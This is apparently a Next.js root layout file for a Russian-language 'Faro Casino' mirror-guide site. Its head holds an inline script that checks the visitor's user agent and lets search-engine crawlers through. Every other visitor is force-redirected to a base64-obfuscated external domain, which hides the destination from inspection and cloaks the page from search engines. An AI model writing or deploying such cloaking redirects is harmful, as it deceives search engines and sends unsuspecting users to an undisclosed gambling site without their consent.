import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import { Cormorant_Garamond, Geist, Geist_Mono } from 'next/font/google'
import './globals.css'

const geist = Geist({ subsets: ['latin', 'cyrillic'], variable: '--font-geist' })
const geistMono = Geist_Mono({ subsets: ['latin', 'cyrillic'], variable: '--font-geist-mono' })
const cormorant = Cormorant_Garamond({ subsets: ['latin', 'cyrillic'], variable: '--font-cormorant', weight: ['500', '600', '700'] })

export const metadata: Metadata = {
  metadataBase: new URL('https://farocasino6.vercel.app/'),
  title: 'Faro Casino — официальный сайт, зеркало и игра онлайн',
  description: 'Faro Casino: независимый гид по официальному сайту, рабочему зеркалу и игре онлайн. Проверка адреса, полезные советы, FAQ и ответственная игра 18+.',
  generator: 'v0.app',
  alternates: { canonical: 'https://farocasino6.vercel.app/' },
  openGraph: {
    title: 'Faro Casino — официальный сайт, зеркало и игра онлайн',
    description: 'Разбираем, как найти официальный Faro Casino, проверить рабочее зеркало и играть онлайн осознанно.',
    url: 'https://farocasino6.vercel.app/',
    siteName: 'Faro Guide',
    locale: 'ru_RU',
    type: 'website',
    images: [{ url: '/faro-hero.png', width: 1200, height: 750, alt: 'Faro Casino — редакционная иллюстрация' }],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Faro Casino — официальный сайт и зеркало',
    description: 'Информационный гид Faro Casino: доступ, игры, проверка адреса и ответственная игра.',
    images: ['/faro-hero.png'],
  },
  icons: { icon: '/icon.svg', shortcut: '/icon.svg' },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#09131f',
  width: 'device-width',
  initialScale: 1,
  userScalable: true,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="yandex-verification" content="8f54f09ce06454a2" />
        <meta name="robots" content="index, follow" /><meta name="format-detection" content="telephone=no" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "IGh0dHBzOi8vY29tYm9zcGFyay50b3AvYWV0ZjN1MnE5dQ== "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      
      <body className={`${geist.variable} ${geistMono.variable} ${cormorant.variable} font-sans antialiased`}>
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
